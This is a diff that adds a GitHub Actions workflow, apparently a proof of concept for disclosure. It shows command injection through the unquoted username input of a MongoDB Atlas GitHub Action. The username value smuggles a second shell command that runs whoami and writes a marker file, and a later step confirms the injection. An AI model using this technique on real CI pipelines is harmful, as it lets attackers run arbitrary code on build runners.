@@ -1,0 +1,38 @@
+name: POC - Command Injection via username in setup
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Command Injection via username
+        uses: mongodb/atlas-github-action@v0.2.0
+        with:
+          run-setup: true
+          # Command injection via username parameter
+          # The username is inserted into FLAGS without quoting, allowing injection
+          username: "testuser; echo '🚨 INJECTION via username 🚨' && echo 'Executed as: '$(whoami) && touch /tmp/username-injection-poc.txt #"
+          password: "testpass123"
+          tier: "M0"
+          provider: "AWS"
+          region: "US_EAST_1"
+
+      - name: Verify Injection
+        shell: bash
+        run: |
+          if [ -f /tmp/username-injection-poc.txt ]; then
+            echo "✅ VULNERABILITY CONFIRMED: Command injection via username successful!"
+            echo ""
+            echo "The username parameter is used in FLAGS without proper quoting."
+            echo "The injected command executed, proving the vulnerability."
+          else
+            echo "❌ Injection may have failed"
+          fi
